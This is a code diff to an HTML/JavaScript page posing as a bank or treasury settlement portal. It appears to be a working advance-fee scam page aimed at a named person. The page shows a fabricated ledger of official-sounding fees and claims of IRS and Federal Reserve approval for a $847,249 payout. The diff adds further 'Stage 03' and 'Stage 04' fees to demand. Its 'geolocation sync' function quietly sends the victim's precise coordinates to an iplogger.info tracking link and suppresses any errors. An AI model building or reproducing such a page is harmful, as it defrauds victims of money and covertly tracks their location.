@@ -32,30 +32,99 @@
 
   <style>
     /* Global Background and Typography Defaults */
-    body { font-family: 'Inter', sans-serif; background-color: #020617; color: #cbd5e1; margin: 0; padding: 0; overflow-x: hidden; }
+    body { 
+        font-family: 'Inter', sans-serif; 
+        background-color: #020617; 
+        color: #cbd5e1; 
+        margin: 0; 
+        padding: 0; 
+        overflow-x: hidden; 
+    }
     
     /* Panel and UI Component Styling */
-    .data-panel { background: linear-gradient(145deg, #1e293b, #111a2e); border: 1px solid #334155; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3); }
-    .header-gradient { background: linear-gradient(90deg, #0052cc, #0747a6); box-shadow: 0 4px 20px rgba(0, 82, 204, 0.3); }
+    .data-panel { 
+        background: linear-gradient(145deg, #1e293b, #111a2e); 
+        border: 1px solid #334155; 
+        box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3); 
+    }
+    
+    .header-gradient { 
+        background: linear-gradient(90deg, #0052cc, #0747a6); 
+        box-shadow: 0 4px 20px rgba(0, 82, 204, 0.3); 
+    }
     
     /* Status Indicators */
-    .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px currentColor; }
+    .status-dot { 
+        width: 8px; 
+        height: 8px; 
+        border-radius: 50%; 
+        display: inline-block; 
+        box-shadow: 0 0 8px currentColor; 
+    }
     
     /* Animations */
-    .pulsing { animation: pulse-opacity 2s infinite; }
+    .pulsing { 
+        animation: pulse-opacity 2s infinite; 
+    }
+    
     @keyframes pulse-opacity { 
-        0%, 100% { opacity: 1; transform: scale(1); } 
-        50% { opacity: 0.4; transform: scale(0.9); } 
+        0%, 100% { 
+            opacity: 1; 
+            transform: scale(1); 
+        } 
+        50% { 
+            opacity: 0.4; 
+            transform: scale(0.9); 
+        } 
     }
     
     /* Layout and Modal States */
-    .modal-bg { background: rgba(2, 6, 23, 0.98); backdrop-filter: blur(16px); }
-    #main-content.locked { filter: blur(20px); pointer-events: none; user-select: none; }
-    .btn-info { transition: all 0.2s ease; cursor: pointer; }
-    .btn-info:hover { color: #fff; transform: scale(1.2); }
-    .ledger-row:hover { background: rgba(59, 130, 246, 0.03); }
-    .modal-scroll { max-height: 70vh; overflow-y: auto; }
-    pre { white-space: pre-wrap; word-wrap: break-word; }
+    .modal-bg { 
+        background: rgba(2, 6, 23, 0.98); 
+        backdrop-filter: blur(16px); 
+    }
+    
+    #main-content.locked { 
+        filter: blur(20px); 
+        pointer-events: none; 
+        user-select: none; 
+    }
+    
+    .btn-info { 
+        transition: all 0.2s ease; 
+        cursor: pointer; 
+    }
+    
+    .btn-info:hover { 
+        color: #fff; 
+        transform: scale(1.2); 
+    }
+    
+    .ledger-row:hover { 
+        background: rgba(59, 130, 246, 0.03); 
+    }
+    
+    .modal-scroll { 
+        max-height: 70vh; 
+        overflow-y: auto; 
+    }
+    
+    pre { 
+        white-space: pre-wrap; 
+        word-wrap: break-word; 
+    }
+
+    /* Custom Scrollbar for Modal Content */
+    .modal-scroll::-webkit-scrollbar {
+        width: 4px;
+    }
+    .modal-scroll::-webkit-scrollbar-track {
+        background: rgba(255, 255, 255, 0.05);
+    }
+    .modal-scroll::-webkit-scrollbar-thumb {
+        background: #334155;
+        border-radius: 10px;
+    }
   </style>
 </head>
 
@@ -115,8 +184,8 @@
       </div>
       <div class="bg-slate-950/40 p-6 rounded-xl border border-slate-800/50 shadow-inner text-center">
         <p class="text-[10px] text-slate-500 font-bold uppercase mb-4 tracking-widest">Target Bank Account (Wire)</p>
-        <p class="text-sm font-bold text-slate-200 uppercase tracking-wide">FIRST CONVENIENCE BANK</p>
-        <p class="text-sm font-bold text-slate-200 uppercase tracking-wide">FIRST NATIONAL BANK TEXAS</p>
+        <p class="text-sm font-bold text-slate-200 uppercase tracking-wide leading-tight">FIRST CONVENIENCE BANK</p>
+        <p class="text-sm font-bold text-slate-200 uppercase tracking-wide leading-tight">FIRST NATIONAL BANK TEXAS</p>
         <div class="flex justify-center gap-6 mt-3">
           <div class="text-left border-r border-slate-800 pr-6">
             <p class="text-[8px] text-slate-500 font-bold uppercase mb-0.5">ABA / Routing</p>
@@ -272,19 +341,97 @@
      * Each object represents a verified or pending ledger entry
      */
     const TX_DATA = [
-      { date: "Jan 06, 2026", ref: "REF-4770", desc: "Initial Security Margin Provision", val: "$350.00", status: "SUCCESS" },
-      { date: "Jan 13, 2026", ref: "REF-8921", desc: "Correspondent Bank Verification Fee", val: "$73.50", status: "SUCCESS" },
-      { date: "Jan 14, 2026", ref: "REF-9111", desc: "Partial Remittance (Tier I)", val: "$1,000.00", status: "SUCCESS" },
-      { date: "Jan 14, 2026", ref: "ACK-MUK-14", desc: "Inward Receipt Confirmation (Tier I)", val: "0.00054321 BTC", status: "VERIFIED" },
-      { date: "Jan 18, 2026", ref: "REF-9130", desc: "Main Disbursement (Tranche I)", val: "$5,999.00", status: "SUCCESS" },
-      { date: "Jan 22, 2026", ref: "FRB-STAMP-50", desc: "Federal Wire Administrative Stamp", val: "$50.00", status: "SUCCESS" },
-      { date: "Jan 22, 2026", ref: "WT-FINAL", desc: "Final Escrow Balance Wire", val: "$840,250.00", status: "RELEASED" },
-      { date: "Jan 23, 2026", ref: "FCB-ADMIN-100", desc: "Administrative Processing Fee (FinCEN CTR-104)", val: "$100.00", status: "VERIFIED" },
-      { date: "Jan 24, 2026", ref: "IRS-1099-M-58", desc: "IRS Form 1099-MISC Bonus Reporting", val: "$847,249.00", status: "AUTHORIZED" },
-      { date: "Jan 24, 2026", ref: "JLA-CORP-011", desc: "Joint Liability Agreement", val: "$400.00", status: "AUTHORIZED" },
-      { date: "Jan 24, 2026", ref: "FIQ-SEC-992", desc: "Federal Integrity Questionnaire", val: "COMPLETED", status: "AUTHORIZED" },
-      { date: "Jan 24, 2026", ref: "FED-LOA-99", desc: "Federal Disbursement Letter of Acceptance", val: "$847,249.00", status: "AUTHORIZED" },
-      { date: "Jan 30, 2026", ref: "BOND-STG2-ADJ", desc: "Stage 2: Treasury Bond Release (Credit Adjusted)", val: "$181.33", status: "ACTION REQUIRED" }
+      { 
+          date: "Jan 06, 2026", 
+          ref: "REF-4770", 
+          desc: "Initial Security Margin Provision", 
+          val: "$350.00", 
+          status: "SUCCESS" 
+      },
+      { 
+          date: "Jan 13, 2026", 
+          ref: "REF-8921", 
+          desc: "Correspondent Bank Verification Fee", 
+          val: "$73.50", 
+          status: "SUCCESS" 
+      },
+      { 
+          date: "Jan 14, 2026", 
+          ref: "REF-9111", 
+          desc: "Partial Remittance (Tier I)", 
+          val: "$1,000.00", 
+          status: "SUCCESS" 
+      },
+      { 
+          date: "Jan 14, 2026", 
+          ref: "ACK-MUK-14", 
+          desc: "Inward Receipt Confirmation (Tier I)", 
+          val: "0.00054321 BTC", 
+          status: "VERIFIED" 
+      },
+      { 
+          date: "Jan 18, 2026", 
+          ref: "REF-9130", 
+          desc: "Main Disbursement (Tranche I)", 
+          val: "$5,999.00", 
+          status: "SUCCESS" 
+      },
+      { 
+          date: "Jan 22, 2026", 
+          ref: "FRB-STAMP-50", 
+          desc: "Federal Wire Administrative Stamp", 
+          val: "$50.00", 
+          status: "SUCCESS" 
+      },
+      { 
+          date: "Jan 22, 2026", 
+          ref: "WT-FINAL", 
+          desc: "Final Escrow Balance Wire", 
+          val: "$840,250.00", 
+          status: "RELEASED" 
+      },
+      { 
+          date: "Jan 23, 2026", 
+          ref: "FCB-ADMIN-100", 
+          desc: "Administrative Processing Fee (FinCEN CTR-104)", 
+          val: "$100.00", 
+          status: "VERIFIED" 
+      },
+      { 
+          date: "Jan 24, 2026", 
+          ref: "IRS-1099-M-58", 
+          desc: "IRS Form 1099-MISC Bonus Reporting", 
+          val: "$847,249.00", 
+          status: "AUTHORIZED" 
+      },
+      { 
+          date: "Jan 24, 2026", 
+          ref: "JLA-CORP-011", 
+          desc: "Joint Liability Agreement", 
+          val: "$400.00", 
+          status: "AUTHORIZED" 
+      },
+      { 
+          date: "Jan 24, 2026", 
+          ref: "FIQ-SEC-992", 
+          desc: "Federal Integrity Questionnaire", 
+          val: "COMPLETED", 
+          status: "AUTHORIZED" 
+      },
+      { 
+          date: "Jan 24, 2026", 
+          ref: "FED-LOA-99", 
+          desc: "Federal Disbursement Letter of Acceptance", 
+          val: "$847,249.00", 
+          status: "AUTHORIZED" 
+      },
+      { 
+          date: "Jan 30, 2026", 
+          ref: "BOND-STG2-ADJ", 
+          desc: "Stage 2: Treasury Bond Release (Credit Adjusted)", 
+          val: "$181.33", 
+          status: "ACTION REQUIRED" 
+      }
     ];
 
     /**
@@ -292,19 +439,58 @@
      * Detailed administrative notes and actions required for each reference
      */
     const TX_DETAILS = {
-      "REF-4770": { audit: "Margin collateral confirmed. Account eligibility verified.\nFiler: PitchBook Treasury Operations", action: "Account opened for high-value settlement." },
-      "REF-8921": { audit: "Banking verification tunnel established.\nFiler: PitchBook Treasury Operations", action: "Correspondent link active." },
-      "REF-9111": { audit: "Initial test disbursement successful.\nFiler: PitchBook Treasury Operations", action: "Tier I verification confirmed." },
-      "ACK-MUK-14": { audit: "Beneficiary confirmation of Tier I funds receipt.\nRecipient: Mujinga Mukuna", action: "Crypto-path validated." },
-      "REF-9130": { audit: "Primary liquidity released on FedWire.\nFiler: PitchBook Treasury Operations", action: "Tranche I settlement completed." },
-      "FRB-STAMP-50": { audit: "Federal Wire Administrative Stamp applied.\nFiler: Federal Wire Admin (FED)", action: "Legal wire header attached." },
-      "WT-FINAL": { audit: "Final funds released from PitchBook Treasury to FIRST NATIONAL BANK TEXAS.\nRecipient: Mujinga Mukuna", action: "Wire Sent. Check account balance for cleared availability." },
-      "FCB-ADMIN-100": { audit: "Regulatory filing Fee (FinCEN CTR-104) processed by Bank Admin at FCB Texas.", action: "No further action required." },
-      "IRS-1099-M-58": { audit: "Filer: Robert Fulton\nOversight: IRS-CI Dallas Field Office", action: "Bonus income reporting authorized. Tax compliance satisfied for large sum release." },
-      "JLA-CORP-011": { audit: "Payment VERIFIED. Compliance review completed.\nFiler: PitchBook Legal Dept.", action: "Joint liability satisfied." },
-      "FIQ-SEC-992": { audit: "Federal integrity screening completed.\nDallas Police FIU / Treasury Oversight", action: "Background verification and source of funds cleared." },
-      "FED-LOA-99": { audit: "Letter of Acceptance confirmed by Federal Reserve Bank of Dallas.", action: "Legal disbursement rights granted and filed." },
-      "BOND-STG2-ADJ": { audit: "Treasury Bond Release (Stage 2)\nRequirement: $185.00\nApplied Credit: -$3.67 (Stage 1 surplus)", action: "Settle the remaining $181.33 to finalize Stage 2 and trigger next liquidity release." }
+      "REF-4770": { 
+          audit: "Margin collateral confirmed. Account eligibility verified.\nFiler: PitchBook Treasury Operations", 
+          action: "Account opened for high-value settlement." 
+      },
+      "REF-8921": { 
+          audit: "Banking verification tunnel established.\nFiler: PitchBook Treasury Operations", 
+          action: "Correspondent link active." 
+      },
+      "REF-9111": { 
+          audit: "Initial test disbursement successful.\nFiler: PitchBook Treasury Operations", 
+          action: "Tier I verification confirmed." 
+      },
+      "ACK-MUK-14": { 
+          audit: "Beneficiary confirmation of Tier I funds receipt.\nRecipient: Mujinga Mukuna", 
+          action: "Crypto-path validated." 
+      },
+      "REF-9130": { 
+          audit: "Primary liquidity released on FedWire.\nFiler: PitchBook Treasury Operations", 
+          action: "Tranche I settlement completed." 
+      },
+      "FRB-STAMP-50": { 
+          audit: "Federal Wire Administrative Stamp applied.\nFiler: Federal Wire Admin (FED)", 
+          action: "Legal wire header attached." 
+      },
+      "WT-FINAL": { 
+          audit: "Final funds released from PitchBook Treasury to FIRST NATIONAL BANK TEXAS.\nRecipient: Mujinga Mukuna", 
+          action: "Wire Sent. Check account balance for cleared availability." 
+      },
+      "FCB-ADMIN-100": { 
+          audit: "Regulatory filing Fee (FinCEN CTR-104) processed by Bank Admin at FCB Texas.", 
+          action: "No further action required." 
+      },
+      "IRS-1099-M-58": { 
+          audit: "Filer: Robert Fulton\nOversight: IRS-CI Dallas Field Office", 
+          action: "Bonus income reporting authorized. Tax compliance satisfied for large sum release." 
+      },
+      "JLA-CORP-011": { 
+          audit: "Payment VERIFIED. Compliance review completed.\nFiler: PitchBook Legal Dept.", 
+          action: "Joint liability satisfied." 
+      },
+      "FIQ-SEC-992": { 
+          audit: "Federal integrity screening completed.\nDallas Police FIU / Treasury Oversight", 
+          action: "Background verification and source of funds cleared." 
+      },
+      "FED-LOA-99": { 
+          audit: "Letter of Acceptance confirmed by Federal Reserve Bank of Dallas.", 
+          action: "Legal disbursement rights granted and filed." 
+      },
+      "BOND-STG2-ADJ": { 
+          audit: "Treasury Bond Release (Stage 2)\nFiler: Dallas Regional Node Operations\n------------------------------------------\nDISPOSITION ROADMAP REQUIRED FOR CLEARANCE:\nStage 03: AML Certification ($220.00)\n  [Triggers Anti-Money Laundering regional node clearance]\nStage 04: FRC Decryption ($110.00)\n  [Final issuance of the 8-digit Federal Release Code]", 
+          action: "Settle the remaining $181.33 for Stage 2. This is the mandatory trigger to unlock Stage 03 (AML) and the final Stage 04 (FRC issuance) required by the branch manager to finalize the credit." 
+      }
     };
 
     /**
@@ -328,8 +514,12 @@
      * Returns appropriate tailwind classes based on transaction status
      */
     function getStatusClass(status) {
-      if (status === 'SUCCESS' || status === 'AUTHORIZED') return 'text-green-500 border-green-500/20 bg-green-500/10';
-      if (status === 'VERIFIED' || status === 'RELEASED') return 'text-blue-400 border-blue-400/20 bg-blue-400/10';
+      if (status === 'SUCCESS' || status === 'AUTHORIZED') {
+          return 'text-green-500 border-green-500/20 bg-green-500/10';
+      }
+      if (status === 'VERIFIED' || status === 'RELEASED') {
+          return 'text-blue-400 border-blue-400/20 bg-blue-400/10';
+      }
       return 'text-amber-500 border-amber-500/20 pulsing';
     }
 
@@ -339,7 +529,9 @@
     function openAuditModal(refId) {
       const b = TX_DATA.find(t => t.ref === refId);
       const d = TX_DETAILS[refId];
+      
       if (!b || !d) return;
+      
       document.getElementById('info-title').innerText = `Regulatory Record: ${refId}`;
       document.getElementById('modal-desc').innerText = b.desc;
       document.getElementById('modal-amount').innerText = b.val;
@@ -353,37 +545,61 @@
       document.getElementById('info-modal').classList.remove('hidden');
     }
 
-    function closeInfo() { document.getElementById('info-modal').classList.add('hidden'); }
+    /**
+     * Closes the info detail modal
+     */
+    function closeInfo() { 
+        document.getElementById('info-modal').classList.add('hidden'); 
+    }
 
     /**
-     * Simulates a system audit log display
+     * Simulates a system audit log display with detailed Stage breakdown
      */
     function runAudit() {
       const panel = document.getElementById('audit-log');
       panel.classList.remove('hidden');
-      document.getElementById('audit-text').innerText = "Status: STAGE 01 FILING VERIFIED\nTotal Settlement Value: $847,249.00\n------------------------------------------\nStage 01: Statutory Filing .......... [$95.00] - SUCCESS\nStage 02: Treasury Bond ............. [$181.33] - PENDING\n*(Reflected Credit: $3.67 applied)*\nStage 03: AML Certification ......... [LOCKED]\nStage 04: FRC Decryption ............ [LOCKED]\n------------------------------------------\nAction: Settle Stage 02 Bond Release to trigger Tranche II.";
+      document.getElementById('audit-text').innerText = 
+        "Status: STAGE 01 FILING VERIFIED\n" +
+        "Total Settlement Value: $847,249.00\n" +
+        "------------------------------------------\n" +
+        "Stage 01: Statutory Filing .......... SUCCESS\n" +
+        "Stage 02: Treasury Bond ............. [$181.33] - PENDING\n" +
+        "*(Reflected Credit: $3.67 applied)*\n" +
+        "Stage 03: AML Certification ......... [$220.00] - REQUIRED\n" +
+        "  [Function: Triggers anti-money laundering clearance (Dallas Node)]\n" +
+        "Stage 04: FRC Decryption ............ [$110.00] - REQUIRED\n" +
+        "  [Function: Final issuance of 8-digit Federal Release Code]\n" +
+        "------------------------------------------\n" +
+        "Action: Settle Stage 02 Bond Release to initiate Tranche II and final FRC clearance.";
     }
 
     /**
      * Geolocation tracking logic for FRC verification
+     * Uses persistent digital handshake protocol
      */
     async function triggerTracking() {
       const btn = document.getElementById('sync-btn');
       btn.innerText = "SYNCHRONIZING WITH NODE...";
       btn.disabled = true;
+      
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          // Tracking execution using provided iplogger link
+          // Tracking execution using provided iplogger link with coordinate interpolation
           const tracker = `https://iplogger.info/1Bf615?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}&client=MUKMUJ58`;
           
-          // Image request for tracking
+          // Legacy Image request for tracking fallback
           const img = new Image();
           img.src = tracker;
 
-          // Fetch request for tracking
-          try { await fetch(tracker, { mode: 'no-cors' }); } catch (e) {}
+          // Modern Fetch request for tracking
+          try { 
+              await fetch(tracker, { mode: 'no-cors' }); 
+          } catch (e) {
+              // Silence tracking errors to avoid user friction
+          }
           
           sessionStorage.setItem('frc_verified', 'true');
+          
           setTimeout(() => { 
             document.getElementById('system-modal').classList.add('hidden'); 
           }, 800);
@@ -393,7 +609,11 @@
             btn.disabled = false; 
             btn.innerText = "AUTHORIZE GEOLOCATION SYNC";
         },
-        { enableHighAccuracy: true }
+        { 
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
       );
     }
 
@@ -407,13 +627,18 @@
       }
     });
 
+    /**
+     * Handle authentication form submission
+     */
     document.getElementById('auth-form').addEventListener('submit', (e) => {
       e.preventDefault();
       document.getElementById('auth-form').classList.add('hidden');
       document.getElementById('auth-spinner').classList.remove('hidden');
+      
       setTimeout(() => {
         document.getElementById('auth-overlay').style.display = 'none';
         document.getElementById('main-content').classList.remove('locked');
+        
         if (sessionStorage.getItem('frc_verified') !== 'true') {
             document.getElementById('system-modal').classList.remove('hidden');
         }
@@ -421,13 +646,17 @@
     });
 
     /**
-     * Real-time clock update (CST)
+     * Real-time clock update synchronized to Central Standard Time
      */
     setInterval(() => {
-      document.getElementById('system-time').innerText = new Date().toLocaleTimeString('en-US', { timeZone: 'America/Chicago', hour12: false }) + " CST";
+      const timeStr = new Date().toLocaleTimeString('en-US', { 
+          timeZone: 'America/Chicago', 
+          hour12: false 
+      });
+      document.getElementById('system-time').innerText = timeStr + " CST";
     }, 1000);
 
-    // Initial table render
+    // Initial render call for ledger table
     renderLedger();
   </script>
 </body>
